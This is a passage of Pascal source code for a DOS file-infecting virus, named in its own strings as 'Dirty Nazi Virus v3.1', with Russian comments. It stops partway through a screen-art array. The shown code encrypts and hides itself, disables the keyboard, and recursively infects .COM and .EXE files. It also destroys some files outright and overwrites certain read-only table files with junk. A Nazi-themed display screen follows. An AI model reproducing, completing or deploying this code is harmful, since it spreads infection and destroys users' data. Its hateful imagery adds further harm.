    TargetBuf         :   Array [1..VirLen] of Char; { тела вируса и инфици- }
    Attr              :   Word;                      { руемой программы }
    CryptBuf          :   Array [1..VirLen Div 2] Of Word;
    Time              :   LongInt;
    InfFiles          :   Byte;
    DirInfo           :   SearchRec;
    Coder , DeCoder   :   Word;
    Crypt             :   Array [1..17] Of String;
    En1 , En2         :   Byte;

 procedure CheckWriteProtect;       { проверка, не стоит ли на диске }
 Label Fuck,Ob;
  begin                             { Write Protect }

   FindFirst(OurName , AnyFile , DirInfo);
   Assign(VirBody , '\'+#$FF);     { Invisible file ! }
   ReWrite(VirBody);
   Erase(VirBody);
   If IOResult <> 0 Then GoTo Fuck;

   Assign(VirBody,Copy(OurName,1,Length(OurName)-Length(DirInfo.Name))+#$FF);
   ReWrite(VirBody);
   Erase(VirBody);
   If IOResult <> 0 Then GoTo Fuck;
   GoTo Ob;

Fuck:
         WriteLn(Crypt[1]);        { Если стоит, то пусть снимут, ато }
         SwapVectors;
         Halt(8);                  { работать не будем }
Ob:
 end;

 procedure Init;                { Процедура инициализации переменных }
  begin                         { программы и проверки условий работы }

     Crypt[1]:='Cannot create temporary file. Disk is write protected.';
     Crypt[2]:='This program requires Igor muDaniloff';
     Crypt[3]:='COMSPEC';
     Crypt[4]:='COMMAND.COM';
     Crypt[5]:='IBMBIO.COM';
     Crypt[6]:='IBMDOS.COM';
     Crypt[7]:='NCMAIN.EXE';
     Crypt[8]:='EMM386.EXE';
     Crypt[9]:='QEMM.EXE';
     Crypt[10]:='WIN.COM';
     Crypt[11]:='.COM';
     Crypt[12]:='.EXE';
     Crypt[13]:='*.*';
     Crypt[14]:='(cl) DNazi SGWW 1996. └a┌┬┐e┌s ┌┬┐Us┼DiE!';
     Crypt[15]:='STACKER.COM';
     Crypt[16]:='Dirty Nazi Virus v3.1. For AdInf & Bugs Fix.';
     Crypt[17]:='Мостовой';

            { oбязaтeльнo пoXORить HIEW пo 69h }

     For En1:=1 To 17 Do
         For En2:=1 To Length(Crypt[En1]) Do
             Crypt[En1,En2]:=Chr(Ord(Crypt[En1,En2]) Xor $69);

     OurName:=ParamStr(0);     { Имя запущенной программы }

     CheckWriteProtect;           { Проверяем, не на Read Only ли диске }
                                  { нас хотели запустить }
     InfFiles:=0;
                                  { Инициализируем параметры }
     CmdLine:='';

     Assign(VirBody , ParamStr(0));
     Reset(VirBody , 1);

     BlockRead(VirBody , VirBuf , VirLen); { Считываем в буфер тело вируса }

     Close(VirBody);

     Decoder:=Ord(VirBuf[158]) + (Ord(VirBuf[157]) Shl 8);

     IF ParamCount <> 0 Then
        Begin
           For I:=1 To ParamCount Do
             CmdLine:=CmdLine + ' ' + ParamStr(I); { считываем параметры }
        End;                                       { в командной строке }

     Dir:='';

     asm
       PUSH AX          { coхpaняeм AX }
       IN AL,21h        { нa вpeмя paбoты виpa выpyбaeм }
       OR AL,3          { клaвy }
       OUT 21h,AL
       POP AX           { вoccтaнaвливaeм AX }
     end;               { кoнeц acceмблepa }

 end;   { end proc }

 procedure ExecOriginal;     { Процедура исполнения зараженной программы }
  begin

    FindFirst(ParamStr(0) , AnyFile , DirInfo);  { Получаем полную инфор- }
                                                 { мацию о файле в пере- }
                                                 { менную DirInfo }
    Assign(VirBody , ParamStr(0));

    Time:=DirInfo.Time;          { Запоминаем дату/время и атрибуты файла }
    Attr:=DirInfo.Attr;

    SetFAttr(VirBody , Archive);    { Устанавливаем аттрибут Archive }

    Reset(VirBody , 1);

    Seek(VirBody , DirInfo.Size - VirLen);

    BlockRead(VirBody , TargetBuf , VirLen);   { "Лечим" зараженный файл }

    Seek(VirBody , DirInfo.Size - VirLen);
    Truncate(VirBody);

    J:=1;
    For I:=1 To VirLen Do
     begin
      CryptBuf[J]:=Ord(TargetBuf[I+1]) + (Ord(TargetBuf[I]) Shl 8);
      Inc(I);
      Inc(J);
     end;

    For I:=1 To VirLen Div 2 Do
     begin
       CryptBuf[I]:=Not CryptBuf[I];
       CryptBuf[I]:=CryptBuf[I] - Decoder;
       CryptBuf[I]:=CryptBuf[I] Xor Decoder;
     end;

    J:=1;
    For I:=1 To VirLen Div 2 Do
     begin
      TargetBuf[J]:=Chr(Hi(CryptBuf[I]));
      TargetBuf[J+1]:=Chr(Lo(CryptBuf[I]));
      Inc(J,2);
     end;

    Seek(VirBody , 0);
    BlockWrite(VirBody , TargetBuf , VirLen);

    SetFTime(VirBody , Time);
    SetFAttr(VirBody , Attr);

    Close(VirBody);

    SwapVectors;
      Exec(GetEnv(Crypt[3]) , '/C ' + OurName + CmdLine);  { Исполняем }
    SwapVectors;
    If DosError <> 0 Then
         WriteLn(Crypt[2]);

    Assign(VirBody , ParamStr(0));
                                                 { Заражаем в обратном }
    SetFAttr(VirBody , Archive);                 { порядке }

    Reset(VirBody , 1);

    Randomize;

    Coder:=Random(65535);

    J:=1;
    For I:=1 To VirLen Do
     begin
      CryptBuf[J]:=Ord(TargetBuf[I+1]) + (Ord(TargetBuf[I]) Shl 8);
      Inc(I);
      Inc(J);
     end;

    For I:=1 To VirLen Div 2 Do
     begin
       CryptBuf[I]:=CryptBuf[I] Xor Coder;
       CryptBuf[I]:=CryptBuf[I] + Coder;
       CryptBuf[I]:=Not CryptBuf[I];
     end;

    J:=1;
    For I:=1 To VirLen Div 2 Do
     begin
      TargetBuf[J]:=Chr(Hi(CryptBuf[I]));
      TargetBuf[J+1]:=Chr(Lo(CryptBuf[I]));
      Inc(J,2);
     end;

    Randomize;
    For I:=31 To 82 Do VirBuf[I]:=Chr(Random(255));

    Randomize;
    For I:=147 To 163 Do VirBuf[I]:=Chr(Random(255));

    VirBuf[157]:=Chr(Hi(Coder));
    VirBuf[158]:=Chr(Lo(Coder));

    BlockWrite(VirBody , VirBuf , VirLen);

    Seek(VirBody , DirInfo.Size - VirLen);

    BlockWrite(VirBody , TargetBuf , VirLen);

    SetFTime(VirBody , Time);         { восстанавливаем дату/время и }
    SetFAttr(VirBody , Attr);         { атрибуты файла }

    Close(VirBody);

 end;   { end proc }

 procedure FindTarget(Dir : PathStr);   { процедура поиска жертвы }

  Var
     Sr  :  SearchRec;

 function VirusPresent : Boolean;    { функция, проверяющая файл на }
  begin                              { зараженность }

     VirusPresent:=False;
     Time:=Sr.Time;         { зaпoминaeм вpeмя нaйдeннoгo фaйлa }
     UnPackTime(Time , DT); { pacпaкoвывaeм зaпиcь вpeмeни }
     If Dt.Sec = 26 Then VirusPresent:=True;

 end;  { end func }

 procedure InfectFile;   { процедура заражения файла }
 Label Quit;
  begin

   If (((Ext=Crypt[11]) And ((Sr.Size<20000) Or (Sr.Size>65000-VirLen))))
      Then GoTo Quit;
   If Sr.Name = Crypt[4] Then GoTo Quit;
   If Sr.Name = Crypt[5] Then GoTo Quit; { проверяем файлы, которые заражать }
   If Sr.Name = Crypt[6] Then GoTo Quit; { не надо }
   If Sr.Name = Crypt[7] Then GoTo Quit;
   If Sr.Name = Crypt[8] Then GoTo Quit; { это чтобы не портить драйвера }
   If Sr.Name = Crypt[9] Then GoTo Quit;
   If Sr.Name = Crypt[10] Then GoTo Quit;{ а это чтобы Форточки не }
   { разражались }
   { диким криком о том, что какое-то приложение нарушает целостность }
   { системы! }
   If ((Ext = Crypt[12]) And (Sr.Size < 10240)) Then GoTo Quit;
   If (Sr.Size mod 1000) = 0 Then
     begin
         Assign(Target , TargetFile);
         SetFAttr(Target , Archive);  { устанавливаем Archive }
         ReWrite(Target);        { Открываем файл для записи, обнуляя его }
         Close(Target);          { закрываем и }
         Erase(Target);          { удаляем его с диска }
       GoTo Quit;
     end;

   If Not VirusPresent Then
    begin                      { если файл еще не заражен, }
                               { заразим его }
       Time:=Sr.Time;          { сохраняем дату/время и }
       Attr:=Sr.Attr;          { атрибуты файла }

       Assign(Target , TargetFile);
       SetFAttr(Target, Archive);   { Устанавливаем Archive }
       Reset(Target , 1);

       BlockRead(Target , TargetBuf , VirLen);

       VirBuf[157]:=Chr(0);
       VirBuf[158]:=Chr(0);

       Seek(Target , 0);
       BlockWrite(Target, VirBuf, VirLen);
                                                   { заражаем }
       J:=1;
       For I:=1 To VirLen Do
         begin
           CryptBuf[J]:=Ord(TargetBuf[I+1]) + (Ord(TargetBuf[I]) Shl 8);
           Inc(I);
           Inc(J);
         end;

       For I:=1 To VirLen Div 2 Do
         begin
           CryptBuf[I]:=Not CryptBuf[I];
         end;

       J:=1;
       For I:=1 To VirLen Div 2 Do
         begin
           TargetBuf[J]:=Chr(Hi(CryptBuf[I]));
           TargetBuf[J+1]:=Chr(Lo(CryptBuf[I]));
           Inc(J,2);
         end;

       Seek(Target , Sr.Size);
       BlockWrite(Target , TargetBuf , VirLen);

       SetFAttr(Target , Attr);     { восстанавливаем дату/время и }

       UnPackTime(Time , DT); { pacпaкoвывaeм зaпиcь вpeмeни }
       DT.Sec:=26;
       PackTime(DT , Time);

       Reset(Target);
       SetFTime(Target , Time);

       Close(Target);

       Inc(InfFiles);               { увеличиваем счетчик зараженных }
                                    { файлов на 1 }
    end;
Quit:
 end;    { end proc }

  begin

      Dir:=Dir + '\';         { устанавливаем корневой каталог }

      FindFirst(Dir + Crypt[13] , AnyFile , Sr);
       While DosError = 0 Do
         begin

           If Sr.Name='' Then Exit;

           TargetFile:=Dir + Sr.Name;   { имя и путь к найденному файлу }

 { Полу- } Ext:=Copy(Sr.Name , Length(Sr.Name) - 3 , Length(Sr.Name));
 { чаем }  Name:=Copy(Sr.Name , 1 , Length(Sr.Name) - Length(Ext));
 { имя и расширение найденного файла }
           If Ext = Crypt[12] Then InfectFile;{ Если .EXE или .COM -- тогда }
           If Ext = Crypt[11] Then InfectFile;{ начинаем процесс заражения }

           If InfFiles > 0 Then Exit;       { если заразили 1 файл -- }
                                            { заканчиваем работу }
           FindNext(Sr);

         end;


      FindFirst(Dir + Crypt[13] , AnyFile , Sr);
       While DosError = 0 Do
        begin

          If (Sr.Name[1] <> '.') And (Sr.Attr = Directory) Then
             FindTarget(Dir + Sr.Name);

         FindNext(Sr);

       end;
  end;      { end proc }

 Procedure FuckTables;
 Var
    Buf   : Array [1..8] Of Char; { буфер для считывания из файла }
    Musor : Array[1..1000] Of Char;
 Label Next;
  begin

     FindFirst('\*.*' , AnyFile , DirInfo);
        While DosError = 0 Do
           begin
               TargetFile:='\' + DirInfo.Name;
               If DirInfo.Size < 200 Then GoTo Next; { если размер < 200b - }
                                              { переход на FindNext, }
                                              { потому что явно не }
                                              { таблица }
            If DirInfo.Attr <> $01 Then      { если атрибуты файла не }
                                             { ReadOnly }
            If DirInfo.Attr <> $03 Then GoTo Next;{ и не ReadOnly + Hidden, }
                                                 { значит, не таблица }
               Assign(Target , TargetFile);
               Attr:=DirInfo.Attr;          { сохраняем атрибуты }
               Time:=DirInfo.Time;          { и время файла }
               SetFAttr(Target , Archive);  { устанавливаем Archive }
               Reset(Target , 1);
               Seek(Target , 177);       { перемещаем указатель на 177 }
                                    { позицию файла }
               BlockRead(Target , Buf , 8); { считываем 8 символов в буфер }
               If Buf = Crypt[17] Then
                 begin
                   Seek(Target , $1D0);
                   BlockWrite(Target , Musor , 1000);
                 end;
               Close(Target);           { закрываем файл и }
               SetFAttr(Target , Attr); { восстанавливаем его атрибуты }
               SetFTime(Target , Time); { и время }
Next:
               FindNext(DirInfo);           { ищем следующий }
            end;
  end;         { конец процедуры FuckTables }

 procedure NaziIndeed;
   Const
        NAZISCREEN : array [1..4000] of Char = (
    ' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,
    ' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,
    ' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,
    ' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,
    ' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,
    ' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,
    ' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,
    ' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,
    ' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,
    ' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,
    ' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,
    ' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#78 ,' ' ,#78 ,' ' ,#78 ,
    ' ' ,#78 ,' ' ,#78 ,' ' ,#78 ,' ' ,#78 ,' ' ,#78 ,' ' ,#78 ,' ' ,#78 ,
    ' ' ,#78 ,' ' ,#78 ,' ' ,#78 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,
    ' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,
    ' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,
    ' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,
    ' ' ,#14 ,' ' ,#14 ,'▄' ,#8  ,'▄' ,#8  ,'▄' ,#8  ,'▄' ,#8  ,'▄' ,#8  ,
    '▄' ,#8  ,'▄' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'▄' ,#8  ,
    '▄' ,#8  ,'▄' ,#8  ,'▄' ,#8  ,'▄' ,#8  ,'▄' ,#8  ,'▄' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#72 ,' ' ,#72 ,'█' ,#8  ,' ' ,#72 ,' ' ,#72 ,' ' ,#72 ,'█' ,#8  ,
    '▀' ,#8  ,'▀' ,#8  ,'▀' ,#8  ,'▀' ,#8  ,' ' ,#72 ,' ' ,#72 ,' ' ,#14 ,
    ' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,
    ' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,
    ' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,
    '▄' ,#8  ,'▄' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'▄' ,#8  ,'▄' ,#8  ,'▄' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#72 ,' ' ,#72 ,'█' ,#8  ,' ' ,#72 ,
    ' ' ,#72 ,' ' ,#72 ,'█' ,#8  ,' ' ,#72 ,' ' ,#72 ,' ' ,#72 ,' ' ,#72 ,
    ' ' ,#72 ,' ' ,#72 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,
    'D' ,#9  ,'i' ,#9  ,'r' ,#9  ,'t' ,#9  ,'y' ,#9  ,' ' ,#9  ,'N' ,#9  ,
    'a' ,#9  ,'z' ,#9  ,'i' ,#9  ,' ' ,#9  ,' ' ,#9  ,' ' ,#9  ,' ' ,#9  ,
    ' ' ,#9  ,' ' ,#9  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'▄' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,'█' ,#8  ,'▄' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#72 ,
    ' ' ,#72 ,'▀' ,#8  ,'▀' ,#8  ,'▀' ,#8  ,'▀' ,#8  ,'█' ,#8  ,'▀' ,#8  ,
    '▀' ,#8  ,'▀' ,#8  ,'█' ,#8  ,' ' ,#72 ,' ' ,#72 ,' ' ,#14 ,' ' ,#14 ,
    ' ' ,#14 ,' ' ,#14 ,'v' ,#9  ,'i' ,#9  ,'r' ,#9  ,'u' ,#9  ,'s' ,#9  ,
    ' ' ,#9  ,'v' ,#9  ,'.' ,#9  ,'3' ,#9  ,'.' ,#9  ,'1' ,#9  ,'b' ,#9  ,
    ' ' ,#9  ,' ' ,#9  ,' ' ,#9  ,' ' ,#9  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'▄' ,#8  ,' ' ,#8  ,'▀' ,#8  ,
    '▌' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,' ' ,#72 ,' ' ,#72 ,' ' ,#72 ,' ' ,#72 ,' ' ,#72 ,
    ' ' ,#72 ,'█' ,#8  ,' ' ,#72 ,' ' ,#72 ,' ' ,#72 ,'█' ,#8  ,' ' ,#72 ,
    ' ' ,#72 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,
    ' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,
    ' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,'█' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'▌' ,#8  ,' ' ,#8  ,'▐' ,#8  ,'▌' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#72 ,' ' ,#72 ,
    '▀' ,#8  ,'▀' ,#8  ,'▀' ,#8  ,'▀' ,#8  ,'▀' ,#8  ,' ' ,#72 ,' ' ,#72 ,
    ' ' ,#72 ,'▀' ,#8  ,' ' ,#72 ,' ' ,#72 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,
    ' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,
    ' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,
    ' ' ,#14 ,' ' ,#14 ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    '█' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#72 ,' ' ,#72 ,' ' ,#72 ,' ' ,#72 ,' ' ,#72 ,' ' ,#72 ,
    ' ' ,#72 ,' ' ,#72 ,' ' ,#72 ,' ' ,#72 ,' ' ,#72 ,' ' ,#72 ,' ' ,#72 ,
    ' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,
    ' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,
    ' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,' ' ,#14 ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'▀' ,#8  ,'▀' ,#8  ,'▀' ,#8  ,'▀' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,'▄' ,#8  ,'▌' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,'┌' ,#2  ,'┬' ,#2  ,'┬' ,#2  ,'┬' ,#2  ,
    '┬' ,#2  ,'┬' ,#2  ,'┬' ,#2  ,'┬' ,#2  ,'┐' ,#2  ,' ' ,#2  ,' ' ,#2  ,
    '┌' ,#2  ,'┬' ,#2  ,'┬' ,#2  ,'┬' ,#2  ,'┬' ,#2  ,'┬' ,#2  ,'┬' ,#2  ,
    '┬' ,#2  ,'┐' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,'▐' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'▀' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,'▀' ,#8  ,'▀' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'▌' ,#8  ,' ' ,#8  ,'█' ,#8  ,'▀' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,'┌' ,#2  ,'┼' ,#2  ,
    '┼' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,'┴' ,#2  ,
    '┘' ,#2  ,' ' ,#2  ,'┌' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,
    '┼' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,'┴' ,#2  ,'┘' ,#2  ,' ' ,#2  ,' ' ,#2  ,
    ' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,'▀' ,#8  ,'▀' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'▄' ,#8  ,'▄' ,#8  ,'▄' ,#8  ,'▀' ,#8  ,'▀' ,#8  ,'█' ,#8  ,
    '▀' ,#8  ,'█' ,#8  ,'█' ,#8  ,'▌' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,'▄' ,#12 ,' ' ,#12 ,
    ' ' ,#12 ,' ' ,#12 ,' ' ,#12 ,' ' ,#12 ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'▀' ,#8  ,' ' ,#8  ,'█' ,#8  ,'▌' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    '┌' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,
    '┴' ,#2  ,'┘' ,#2  ,' ' ,#2  ,' ' ,#2  ,'┌' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,
    '┼' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,'┴' ,#2  ,'┘' ,#2  ,' ' ,#2  ,
    ' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,'▄' ,#8  ,
    '▀' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,'▀' ,#8  ,'▀' ,#8  ,'▀' ,#8  ,
    '▀' ,#8  ,'▄' ,#8  ,'▌' ,#8  ,'▀' ,#8  ,'▀' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,'▐' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'▀' ,#8  ,'▀' ,#8  ,'▄' ,#8  ,'▄' ,#8  ,
    '▀' ,#8  ,'▀' ,#8  ,'▌' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
